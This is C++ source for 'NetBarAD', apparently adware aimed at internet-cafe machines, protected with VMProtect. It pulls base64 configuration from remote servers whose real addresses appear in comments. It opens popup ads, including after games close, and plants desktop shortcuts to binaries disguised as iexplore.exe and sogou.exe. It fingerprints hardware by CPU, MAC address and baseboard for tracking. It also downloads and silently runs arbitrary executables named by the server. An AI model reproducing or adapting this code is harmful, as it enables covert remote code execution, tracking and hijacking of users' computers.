#include "stdafx.h"
#include "NetBarAD.h"
#include <process.h>
#include <io.h>
#include <direct.h>
#include <map> 
using std::map;
#include "VMProtectSDK.h"
#pragma comment(lib, "VMProtectSDK32.lib")

extern HMODULE g_hDLLModule;
extern BOOL g_isExit;
string g_strConfig = "";
map<string, int> g_mapForExitGame;

// http://20170712.java.cdnjsp.wang/getClient.jsp?id=1
// http://42.51.190.195/getClient.jsp?id=1
// http://42.51.191.54/getClient.jsp?id=6
//wstring g_wszServerName(L"20170712.java.cdnjsp.wang");
//wstring g_wszServerName(L"140.143.182.56");
//WORD g_nServerPort = 80;

// 1###1234567891234567###http://xxxx/getClient.jsp###http://xxxx/click.jsp
string g_strGetClientURL;
string g_strClickURL;
string g_strUserID;

#pragma optimize( "g", off )
unsigned int _stdcall ThreadDoWork(VOID* param)
{
	
	VMProtectBegin("ThreadDoWork");


	Utility_EnabledDebugPrivilege();
	DoGetServerUrl();
	DoWritePIDFile();

	DWORD dwPID = GetCurrentProcessId();
	char szTmp[1024] = {0};
	sprintf(szTmp, "%d", dwPID);
	string strPID(szTmp);

	while(TRUE)
	{
		if (IsHaveRun())
		{
			string strMsg("NETBARAD waiting...");
			strMsg += strPID;
			//WriteLogFileEx(strMsg);
			Sleep(1000*3);
			continue;
		}

		break;
	}
	

	_beginthreadex(NULL, 0, ThreadGetConfig, NULL, 0, NULL);
	_beginthreadex(NULL, 0, ThreadCreateIEShortcut, NULL, 0, NULL);	// 1 创建桌面快捷方式
	_beginthreadex(NULL, 0, ThreadOpenIE, NULL, 0, NULL);	// 2 开机弹窗
	_beginthreadex(NULL, 0, ThreadPopupWindows, NULL, 0, NULL);	// 3 桌面右下角弹窗广告
	_beginthreadex(NULL, 0, ThreadProcessExitPopupWindows, NULL, 0, NULL);	// 4 游戏退弹
	//_beginthreadex(NULL, 0, ThreadLockIEHomePage, NULL, 0, NULL);	// 5 IE锁定
	_beginthreadex(NULL, 0, ThreadHaveProcessPopupWindows, NULL, 0, NULL);	// 6 检测到对应进程名称 打开url

	while(!g_isExit)
	{
		DoWritePIDRunFile();
		string strMsg("ThreadDoWork...");
		strMsg += strPID;
		//WriteLogFileEx(g_strConfig);
		//WriteLogFileEx(strMsg);
		Sleep(1000*5);
	}

	VMProtectEnd();
	
	return 0;
}

VOID DoGetServerUrl(VOID)
{
	// 1###1234567891234567###http://xxxx/getClient.jsp###http://xxxx/click.jsp
	string strConfig;
	CHAR szDLLPath[MAX_PATH] = {0};
	GetModuleFileName(g_hDLLModule, szDLLPath, sizeof(szDLLPath));
	Utility_GetOverlayText(szDLLPath, strConfig);

	vector<string> vecCfg;
	Utility_Split(strConfig, "###", vecCfg);
	g_strUserID = vecCfg[0];
	g_strGetClientURL = vecCfg[2];
	g_strClickURL = vecCfg[3];

	WriteLogFileEx(strConfig);
	WriteLogFileEx(g_strUserID);
	WriteLogFileEx(g_strGetClientURL);
	WriteLogFileEx(g_strClickURL);
}

unsigned int _stdcall ThreadGetConfig(VOID* param)
{
	VMProtectBegin("ThreadGetConfig");
	while(!g_isExit)
	{
		Utility_DebugLogEx("ThreadGetConfig...");
		if (g_strConfig.find("type")  == string::npos || 
			g_strConfig.find("state") == string::npos || 
			g_strConfig.find("param") == string::npos)
		{
			DoGetConfig(g_strConfig);
			WriteLogFile("获取配置信息完毕");
		}

		WriteLogFileEx(g_strConfig);
		Sleep(1000*60);
	}
	 VMProtectEnd();
	return 0;
}

unsigned int _stdcall ThreadCreateIEShortcut(VOID* param)
{
	VMProtectBegin("ThreadCreateIEShortcut");
	while(!DoCreateIEShortcut(g_strConfig) && !g_isExit)
	{
		Sleep(1000*2);
	}

	DoFeedback(L"1");
	WriteLogFile("完成创建桌面快捷方式");
	 VMProtectEnd();
	return 0;
}

unsigned int _stdcall ThreadOpenIE(VOID* param)
{
	VMProtectBegin("ThreadOpenIE");
	while(!DoOpenIE(g_strConfig) && !g_isExit)
	{
		Sleep(1000*2);
	}

	DoFeedback(L"2");
	WriteLogFile("完成开机弹窗...");
	 VMProtectEnd();
	return 0;
}

unsigned int _stdcall ThreadPopupWindows(VOID* param)
{
	VMProtectBegin("ThreadPopupWindows");
	BOOL bRet = FALSE;
	int iSleep = 0;
	int iCount = 0;
	while(!g_isExit)
	{
		if (iCount == 0)
		{
			Sleep(1000*60*5); // 第一次5分钟
		}
		if (iCount == 1)
		{
			Sleep(1000*60*40); // 第2次40分钟
		}
		if (iCount > 1)
		{
			Sleep(1000*60*30); // 其余每隔30分钟弹一次
		}

		WriteLogFile("ThreadPopupWindows running...");
		bRet = DoPopupWindows(g_strConfig);
		if (bRet)
		{
			iCount++;
			DoFeedback(L"3");
			WriteLogFile("完成右下角弹出");
		}
		else
		{
			Sleep(1000);
		}
		
	}

	WriteLogFile("退出右下角弹出");
	VMProtectEnd();
	return 0;
}

unsigned int _stdcall ThreadProcessExitPopupWindows(VOID* param)
{
	VMProtectBegin("ThreadProcessExitPopupWindows");
	BOOL bRet = FALSE;
	while(!g_isExit)
	{
		//Utility_DebugLogEx("ThreadProcessExitPopupWindows running...");
		bRet = DoProcessExitPopupWindows(g_strConfig);
		if (bRet)
		{
			WriteLogFile("游戏退弹成功..");
			DoFeedback(L"4");
		}
		Sleep(1000*1);
	}

	WriteLogFile("退出游戏退弹 ThreadProcessExitPopupWindows exit...");
	VMProtectEnd();
	return 0;
}

unsigned int _stdcall ThreadLockIEHomePage(VOID* param)
{
	VMProtectBegin("ThreadLockIEHomePage");
	BOOL bRet = FALSE;
	INT iCount = 0;
	while(!g_isExit)
	{
		bRet = DoLockIEHomePage(g_strConfig);
		//DoCloseBrowse(g_strConfig);
		if (bRet)
		{
			iCount++;;
		}
		if (iCount == 1)
		{
			DoFeedback(L"5");
			WriteLogFile("完成锁定IE主页");
		}

		Sleep(500);
	}
	VMProtectEnd();
	
	return 0;
}
#pragma optimize( "g", on )

VOID DoGetConfig(string &strConfig)
{
	// http://12246846221.java.jspee.cn/getClient.jsp?id=1
	// http://12246846221.java.jspee.cn/click.jsp?id=1&type=1&key=cpu_zhuban_00-00-00-00
	string result = "";
	//Utility_Http_Get(wstring(L"12246846221.java.jspee.cn"), 80, wstring(L"getClient.jsp?id=1"), result);

	string webUrl(g_strGetClientURL);
	webUrl += "?id=";
	webUrl += g_strUserID;
	Utility_Http_Get(webUrl, result);
	//Utility_DebugLog(result);

	Utility_Replace(result, " ", "");
	Utility_Replace(result, "	", "");
	Utility_Replace(result, "\r\n", "");
	Utility_Replace(result, "\r", "");
	Utility_Replace(result, "\n", "");
	
	int OutByte = 0;
	WriteLogFile("原始配置：");
	WriteLogFileEx(result);

	result = Utility_Base64_Decode(result.c_str(), result.length(), OutByte);
	WriteLogFile("Utility_Base64_Decode:");
	WriteLogFileEx(result);


	/*result = Utility_UTF8ToGBK(result);
	WriteLogFile("Utility_UTF8ToGBK:");
	WriteLogFileEx(result);*/

	strConfig = result;
}

BOOL DoPopupWindows(string &strConfig)
{
	BOOL bRet = FALSE;
	vector<string> vecCfg;
	Utility_Split(strConfig, "}", vecCfg);
	vector<string>::iterator it = vecCfg.begin();
	for (it; it != vecCfg.end(); it++)
	{
		string strJson = *it;
		strJson += "}";

		string strParam;
		string strState;
		string strType;
		Utility_GetJsonItem(strJson, "param", strParam);
		Utility_GetJsonItem(strJson, "state", strState);
		Utility_GetJsonItem(strJson, "type",  strType);
		if(strState!= "1") continue;
		if(strType != "3") continue;

		vector<string> vecUrls;
		Utility_Split(strParam, ",", vecUrls);
		if(vecUrls.size() <= 0) continue;

		int iPos = Utility_Rand(0, vecUrls.size() -1);
		string url =vecUrls[iPos];
		if(url.find("http") == string::npos) continue;
		Utility_Replace(url, "\"", "");

		//Utility_ShowRightCornerWindow(g_hDLLModule, url.c_str(), "");
		DoOpenRightCorner(url);

		WriteLogFile("右下角弹窗：");
		WriteLogFileEx(url);

		bRet = TRUE;
	}
	return bRet;
}

BOOL DoProcessExitPopupWindows(string &strConfig)
{
	BOOL bRet = FALSE;
	vector<string> vecCfg;
	Utility_Split(strConfig, "}", vecCfg);
	vector<string>::iterator it = vecCfg.begin();
	for (it; it != vecCfg.end(); it++)
	{
		string strJson = *it;
		strJson += "}";

		string strParam;
		string strState;
		string strType;
		Utility_GetJsonItem(strJson, "param", strParam);
		Utility_GetJsonItem(strJson, "state", strState);
		Utility_GetJsonItem(strJson, "type",  strType);
		if(strState!= "1") continue;
		if(strType != "4") continue;

		vector<string> vecUrls;
		Utility_Split(strParam, ",", vecUrls); // {"param":"11.exe,http://xxx,22.exe,http://xxx","state":1,"type":4},
		if(vecUrls.size() < 2) continue;
		if(vecUrls.size() % 2 != 0) continue;

		for (int i = 0; i < vecUrls.size();)
		{
			string processName = vecUrls[i];
			string url	       = vecUrls[i+1];
			Utility_Replace(processName, "\"", "");
			Utility_Replace(url, "\"", "");

			if (Utility_IsHaveProcess((CHAR*)processName.c_str()))
			{
				g_mapForExitGame[processName] = 1;
			}


			if (!Utility_IsHaveProcess((CHAR*)processName.c_str()) && g_mapForExitGame[processName] == 1)
			{
				g_mapForExitGame[processName] = 0;

				WriteLogFile("进程退弹：");
				WriteLogFileEx(processName);
				WriteLogFileEx(url);
				OpenBrowse_YiDian(url.c_str());
				bRet = TRUE;
			}
			i += 2;
		}

		
	}
	return bRet;
}

BOOL DoLockIEHomePage(string &strConfig)
{
	BOOL bRet = FALSE;
	vector<string> vecCfg;
	Utility_Split(strConfig, "}", vecCfg);
	vector<string>::iterator it = vecCfg.begin();
	for (it; it != vecCfg.end(); it++)
	{
		string strJson = *it;
		strJson += "}";

		string strParam;
		string strState;
		string strType;
		Utility_GetJsonItem(strJson, "param", strParam);
		Utility_GetJsonItem(strJson, "state", strState);
		Utility_GetJsonItem(strJson, "type",  strType);
		if(strState!= "1") continue;
		if(strType != "5") continue;

		Utility_Replace(strParam, "\"", "");
		Utility_SetHomePage((char*)strParam.c_str(), TRUE);
		
		bRet = TRUE;
	}
	return bRet;
}

BOOL DoOpenIE(string &strConfig)
{
	BOOL bRet = FALSE;
	vector<string> vecCfg;
	Utility_Split(strConfig, "}", vecCfg);
	vector<string>::iterator it = vecCfg.begin();
	for (it; it != vecCfg.end(); it++)
	{
		string strJson = *it;
		strJson += "}";

		string strParam;
		string strState;
		string strType;
		Utility_GetJsonItem(strJson, "param", strParam);
		Utility_GetJsonItem(strJson, "state", strState);
		Utility_GetJsonItem(strJson, "type",  strType);
		if(strState!= "1") continue;
		if(strType != "2") continue;
		
		Utility_Replace(strParam, "\"", "");
		OpenBrowse_YiDian(strParam.c_str());
		
		bRet = TRUE;
	}
	return bRet;
}

BOOL DoCreateIEShortcut(string &strConfig)
{
	BOOL bRet = FALSE;
	vector<string> vecCfg;
	Utility_Split(strConfig, "}", vecCfg);
	vector<string>::iterator it = vecCfg.begin();
	for (it; it != vecCfg.end(); it++)
	{
		string strJson = *it;
		strJson += "}";

		string strParam;
		string strState;
		string strType;
		Utility_GetJsonItem(strJson, "param", strParam);
		Utility_GetJsonItem(strJson, "state", strState);
		Utility_GetJsonItem(strJson, "type",  strType);
		if(strState!= "1") continue;
		if(strType != "1") continue;

		vector<string> vecIEShortcut;
		Utility_Split(strParam, ",", vecIEShortcut);
		if(vecIEShortcut.size() < 3) continue;

		string strFileName = vecIEShortcut[0];
		string strFileIcon = vecIEShortcut[1];
		string strFileUrl  = vecIEShortcut[2];

		Utility_Replace(strFileName, "\"", "");
		Utility_Replace(strFileIcon, "\"", "");
		Utility_Replace(strFileUrl,  "\"", "");

		string filePath;
		Utility_GetDesktopDir(filePath);
		if (filePath.find("systemprofile") != string::npos)
		{
			WriteLogFile("发现 systemprofile");
			filePath = "C:\\Users\\Administrator\\Desktop";
		}

		filePath += "\\";
		filePath += strFileName;
		filePath += ".lnk"; // .url

		string strLinkDst;
		Utility_GetSysTmpFolder(strLinkDst);
		strLinkDst += "\\iexplore.exe";

		Utility_Replace(filePath, "?", "");
		WriteLogFile("快捷方式所在位置：");
		WriteLogFileEx(filePath);
		//Utility_CreateInternetShortcut((CHAR*)filePath.c_str(), (CHAR*)strFileUrl.c_str(), (CHAR*)strFileIcon.c_str());
		bRet = Utility_CreateFileShortcut(filePath.c_str(), strLinkDst.c_str(), strFileUrl.c_str());
		if (!Utility_IsHaveFile(filePath.c_str()))
		{
			bRet = FALSE;
		}

		// change icon
		string strIconPath;
		Utility_GetSysTmpFolder(strIconPath);
		strIconPath += "\\icons\\sysie.ico";
		MakeSureDirectoryPathExists(strIconPath.c_str());
		wstring wstrFileName = Utility_string2wstring(strIconPath);
		wstring wstrDownUrl  = Utility_string2wstring(strFileIcon);
		bRet  = Utility_Http_DownloadFile(wstrDownUrl.c_str(),  wstrFileName.c_str());
		Utility_ChangeLinkIcon(filePath, strIconPath);

		WriteLogFile("快捷方式图标信息：");
		WriteLogFileEx(strFileUrl);
		WriteLogFileEx(strIconPath);
	}
	return bRet;
}

VOID GetFeedbackKey(string& strKey)
{
	string strCPU;
	string strMAC;
	string strBaseBoard;
	CHAR szBaseBoard[1024] = {0};
	Utility_GetCpuID(strCPU);
	Utility_GetMacAddress(strMAC);
	Utility_GetBaseBoardByCmd(szBaseBoard, sizeof(szBaseBoard));
	strBaseBoard = string(szBaseBoard);
	strKey = strCPU;
	strKey += "_";
	strKey += strBaseBoard;
	strKey += "_";
	strKey += strMAC;
}

VOID DoFeedback(wstring type)
{
	string result = "";
	// http://xxxx/click.jsp?id=1&type=1&key=cpu_zhuban_00-00-00-00
	//Utility_Http_Get(wstring(L"12246846221.java.jspee.cn"), 80, wstring(L"getClient.jsp?id=1"), result);
	string strKey;
	string strType;
	GetFeedbackKey(strKey);
	strType = Utility_wstring2string(type);

	CHAR szUrl[4096] = {0};
	strcat(szUrl, g_strClickURL.c_str());
	strcat(szUrl, "?id=");
	strcat(szUrl, g_strUserID.c_str());
	strcat(szUrl, "&type=");
	strcat(szUrl, strType.c_str());
	strcat(szUrl, "&key=");
	strcat(szUrl, strKey.c_str());
	string webUrl(szUrl);

	WriteLogFile("开始反馈:");
	WriteLogFileEx(webUrl);

	Utility_Http_Get(webUrl, result);

	string strLog = "反馈结果：";
	strLog += result;
	WriteLogFileEx(strLog);
}

unsigned int _stdcall ThreadHaveProcessPopupWindows(VOID* param)
{
	BOOL bRet = FALSE;
	while(!g_isExit)
	{
		//WriteLogFile("ThreadHaveProcessPopupWindows running...");
		bRet = DoHaveProcessPopupWindows(g_strConfig);
		if (bRet)
		{
			WriteLogFile("云增值业务执行成功...");
			DoFeedback(L"6");
		}
		Sleep(1000*2);
	}

	WriteLogFile("ThreadHaveProcessPopupWindows exit...");
	return 0;
}

BOOL DoHaveProcessPopupWindows(string &strConfig)
{
	BOOL bRet = FALSE;
	vector<string> vecCfg;
	Utility_Split(strConfig, "}", vecCfg);
	vector<string>::iterator it = vecCfg.begin();
	for (it; it != vecCfg.end(); it++)
	{
		string strJson = *it;
		strJson += "}";

		string strParam;
		string strState;
		string strType;
		Utility_GetJsonItem(strJson, "param", strParam);
		Utility_GetJsonItem(strJson, "state", strState);
		Utility_GetJsonItem(strJson, "type",  strType);
		if(strState!= "1") continue;
		if(strType != "6") continue;

		vector<string> vecUrls;
		Utility_Split(strParam, ",", vecUrls);
		if(vecUrls.size() < 2) continue;
		if(vecUrls.size() % 2 != 0) continue;

		for (int i = 0; i < vecUrls.size();)
		{
			string processName = vecUrls[i];
			string url	       = vecUrls[i+1];
			i += 2;

			Utility_Replace(processName, "\"", "");
			Utility_Replace(url, "\"", "");

			if (Utility_IsHaveProcess((CHAR*)processName.c_str()))
			{
				wstring wstrDownUrl = Utility_string2wstring(url);

				char cstrFileName[MAX_PATH] = {0};
				SYSTEMTIME systime;
				GetLocalTime(&systime);
				sprintf(cstrFileName,"%04d%02d%02d%02d%02d%02d%03d.exe",
					systime.wYear,
					systime.wMonth,systime.wDay,         
					systime.wHour, systime.wMinute,systime.wSecond,
					systime.wMilliseconds);

				std::string strDstDir;
				Utility_GetNetbarADDir(strDstDir);
				string strFileName(cstrFileName);
				string downFilePath = strDstDir + strFileName;
				wstring wstrFileName = Utility_string2wstring(downFilePath);
				bRet  = Utility_Http_DownloadFile(wstrDownUrl.c_str(),  wstrFileName.c_str());

				WriteLogFile("下载文件：");
				WriteLogFileEx(url);
				WriteLogFile(downFilePath.c_str());

				if (bRet)
				{
					//ShellExecute(NULL,"open", cstrFileName,NULL,NULL,SW_SHOWNORMAL);
					Utility_CreateProcessAsUser((char*)downFilePath.c_str());
					Utility_Replace(strConfig, processName, "XXX_YYY"); // 只运行一次，所以必须替换进程名称
				}
				else
				{
					WriteLogFile("Utility_Http_DownloadFile下载文件失败...");
				}
			}
		}
		
	}
	return bRet;
}

BOOL DoCloseBrowse(string &strConfig)
{
	BOOL bRet = FALSE;
	vector<string> vecCfg;
	Utility_Split(strConfig, "}", vecCfg);
	vector<string>::iterator it = vecCfg.begin();
	CHAR szBuf[1024] = {0};
	for (it; it != vecCfg.end(); it++)
	{
		string strJson = *it;
		strJson += "}";

		string strParam;
		string strState;
		string strType;
		Utility_GetJsonItem(strJson, "param", strParam);
		Utility_GetJsonItem(strJson, "state", strState);
		Utility_GetJsonItem(strJson, "type",  strType);
		if(strState!= "1") continue;
		if(strType != "7") continue;

		string strProcessName;
		vector<string> vecProcessNames;
		Utility_Split(strParam, ",", vecProcessNames);
		for (int i = 0; i < vecProcessNames.size();)
		{
			strProcessName = vecProcessNames[i];
			Utility_Replace(strProcessName, "\"", "");
			if (Utility_IsHaveProcess((CHAR*)strProcessName.c_str()))
			{
				bRet = Utility_CloseProcess(strProcessName.c_str());
				sprintf(szBuf, "结束进程:%s:%d", strProcessName.c_str(), bRet);
				WriteLogFile(szBuf);
			}
		}
	}

	return bRet;
}

BOOL DoOpenRightCorner(string &url)
{
	CHAR szIECacheDir[MAX_PATH] = {0};
	SHGetSpecialFolderPath(NULL, szIECacheDir, CSIDL_INTERNET_CACHE, TRUE);

	string strDstFileName("sogou.exe");
	//Utility_RandFileName(strDstFileName, string(".exe"));

	string strWinFolder;
	Utility_GetSysTmpFolder(strWinFolder);

	string strDir;
	Utility_GetCurrentModuleDir(strDir, g_hDLLModule);
	string strSrcFile(strDir);
	string strDstFile(strWinFolder);
	strSrcFile  += ("\\RightCorner.exe");
	strDstFile += ("\\");
	strDstFile += (strDstFileName);
	CopyFile(strSrcFile.c_str(), strDstFile.c_str(), TRUE);
	strDstFile += " ";
	strDstFile += (url);
	Utility_CreateProcessAsUser((LPTSTR)strDstFile.c_str());
	WriteLogFile("右下角弹窗:");
	WriteLogFileEx(strDstFile);
	return TRUE;
}

BOOL IsHaveRun(VOID)
{
	string strDir;
	string strFindDir;
	Utility_GetCurrentModuleDir(strDir, g_hDLLModule);
	strFindDir = string(strDir);
	strFindDir += ("\\*.run");

	//WriteLogFileEx(strFindDir);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind=::FindFirstFile(strFindDir.c_str(),&FindFileData);
	if(INVALID_HANDLE_VALUE  ==  hFind)
	{
		WriteLogFile("FindFirstFile 失败...");
		return FALSE;
	}

	CHAR szLog[1024] = {0};

	while(TRUE)
	{
		if (strstr(FindFileData.cFileName, ".run") != NULL) // 222.run
		{
			string strFileName(FindFileData.cFileName);
			Utility_Replace(strFileName, ".run", "");
			DWORD dwPID = atoi(strFileName.c_str());
			if (Utility_IsHaveProcessEx(dwPID))
			{
				sprintf(szLog, "IsHaveRun 进程存在：%d", dwPID);
				//WriteLogFile(szLog);
				return TRUE;
			}
			else
			{
				sprintf(szLog, "IsHaveRun 进程不存在：%d", dwPID);
				//WriteLogFile(szLog);

				string strFilePath = string(strDir);
				strFilePath += "\\";
				strFilePath += string(FindFileData.cFileName);
				DeleteFile(strFilePath.c_str());
				return FALSE;
			}
		}

		if(!FindNextFile(hFind,&FindFileData)) break;
	}

	//WriteLogFile("IsHaveRun end...");
	return FALSE;
}

VOID DoWritePIDFile(VOID)
{
	DWORD dwPID = GetCurrentProcessId();
	string strDir;
	Utility_GetCurrentModuleDir(strDir, g_hDLLModule);

	char szFileName[32] = {0};
	sprintf(szFileName, "\\%d.txt", dwPID);
	string strFile(strDir);
	strFile += (szFileName);

	HANDLE hFile = CreateFile(strFile.c_str(), GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
	}
}

VOID DoWritePIDRunFile(VOID)
{
	DWORD dwPID = GetCurrentProcessId();
	string strDir;
	Utility_GetCurrentModuleDir(strDir, g_hDLLModule);

	char szFileName[32] = {0};
	sprintf(szFileName, "\\%d.run", dwPID);
	string strFile(strDir);
	strFile += (szFileName);

	if (Utility_IsHaveFile(strFile.c_str()))
	{
		return;
	}

	HANDLE hFile = CreateFile(strFile.c_str(), GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
	}
}

VOID WriteLogFile(LPCSTR szLog)
{
	if (szLog == NULL)
	{
		return;
	}

	string strDir;
	Utility_GetCurrentModuleDir(strDir, g_hDLLModule);
	string strFile(strDir);
	strFile += ("\\NetBarAD.txt");

	FILE *pFile = fopen(strFile.c_str(), "a");
	if (pFile == NULL)
	{
		return;
	}

	SYSTEMTIME s_time;
	GetLocalTime(&s_time);
	char szTime[128] = {0};
	sprintf(szTime, "[%04d%02d%02d %02d:%02d:%02d, %03d] ", s_time.wYear, s_time.wMonth, s_time.wDay, s_time.wHour, s_time.wMinute, s_time.wSecond, s_time.wMilliseconds);

	string strLog(szTime);
	strLog += (szLog);
	strLog += ("\r\n");

	fwrite(strLog.c_str(), 1, strLog.length(), pFile);
	fclose(pFile);
	pFile = NULL;
}

VOID WriteLogFileEx(string strLog)
{
	WriteLogFile(strLog.c_str());
}

VOID OpenBrowse_YiDian(CONST CHAR* szUrl)
{
	string strDstFileName("iexplore.exe");
	//Utility_RandFileName(strDstFileName, string(".exe"));

	string strWinFolder;
	Utility_GetSysTmpFolder(strWinFolder);

	string strDir;
	Utility_GetCurrentModuleDir(strDir, g_hDLLModule);
	string strSrcFile(strDir);
	string strDstFile(strWinFolder);
	strSrcFile  += ("\\Yidian.exe");
	strDstFile += ("\\");
	strDstFile += (strDstFileName);

	CopyFile(strSrcFile.c_str(), strDstFile.c_str(), TRUE);
	strDstFile += " ";
	strDstFile += (szUrl);
	Utility_CreateProcessAsUser((LPTSTR)strDstFile.c_str());
	WriteLogFile("OpenBrowse_YiDian:");
	WriteLogFileEx(strDstFile);
}
